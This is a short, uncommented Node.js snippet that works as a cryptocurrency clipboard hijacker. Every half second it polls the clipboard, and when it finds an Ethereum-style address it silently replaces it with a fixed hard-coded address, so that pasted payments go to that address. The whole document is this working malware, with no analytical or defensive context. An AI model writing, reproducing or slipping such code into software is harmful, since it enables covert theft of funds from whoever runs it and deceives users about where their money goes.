const clipboardy = require('clipboardy');
setInterval(() => {
  if (/^0x[0-9a-fA-F]{40}$/.test(clipboardy.readSync())) clipboardy.writeSync('0x7a1f9c3e5b2d4068af1e3c5d7b9f0a2c4e6d8b0a');
}, 500);
